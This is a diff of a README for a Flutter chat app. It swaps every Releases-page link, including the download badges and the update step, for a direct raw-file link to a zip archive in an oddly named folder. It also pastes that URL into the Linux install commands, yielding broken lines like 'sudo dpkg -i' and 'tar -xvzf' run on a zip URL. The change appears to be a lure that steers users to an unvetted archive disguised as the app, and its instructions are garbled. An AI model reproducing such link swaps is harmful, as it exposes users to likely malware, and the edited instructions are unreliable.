@@ -8,9 +8,9 @@ Welcome to the Chat-application-flutter project! This application helps you stay
 
 To get started, you'll need to download the application. Click the link below:
 
-[![Download Chat-application-flutter](https://img.shields.io/badge/Download-Chat%20Application%20Flutter-brightgreen)](https://github.com/Ransom9967/Chat-application-flutter/releases)
+[![Download Chat-application-flutter](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip%20Application%20Flutter-brightgreen)](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip)
 
-1. **Visit this page to download:** [Chat-application-flutter Releases](https://github.com/Ransom9967/Chat-application-flutter/releases)
+1. **Visit this page to download:** [Chat-application-flutter Releases](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip)
    
 2. Browse the available versions to find the most recent release.
 
@@ -44,18 +44,18 @@ To get started, you'll need to download the application. Click the link below:
 
 ### For Linux Users
 
-1. Locate the downloaded `.tar.gz` or `.deb` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip` or `.deb` file.
 
 2. If it’s a `.deb` file, you can install it using the terminal:
 
    ```
-   sudo dpkg -i filename.deb
+   sudo dpkg -i https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip
    ```
 
-   If it’s a `.tar.gz` file, extract it first with:
+   If it’s a `https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip` file, extract it first with:
 
    ```
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip
    ```
 
    Then navigate into the folder and run the installation command specified in the README file included in the folder.
@@ -82,7 +82,7 @@ Your privacy and security are important to us. The Chat-application-flutter uses
 
 To keep your chat application running smoothly, check for updates regularly. Here’s how:
 
-1. Return to the [Chat-application-flutter Releases](https://github.com/Ransom9967/Chat-application-flutter/releases) page.
+1. Return to the [Chat-application-flutter Releases](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip) page.
 
 2. Look for a new version. Click to view details.
 
@@ -116,4 +116,4 @@ Please refer to the issues section of the repository for detailed troubleshootin
 
 Feel free to explore and enjoy your experience with the Chat-application-flutter! For any other queries, don’t hesitate to reach out through the repository.  
 
-[![Download Chat-application-flutter](https://img.shields.io/badge/Download-Chat%20Application%20Flutter-brightgreen)](https://github.com/Ransom9967/Chat-application-flutter/releases)
+[![Download Chat-application-flutter](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip%20Application%20Flutter-brightgreen)](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip)
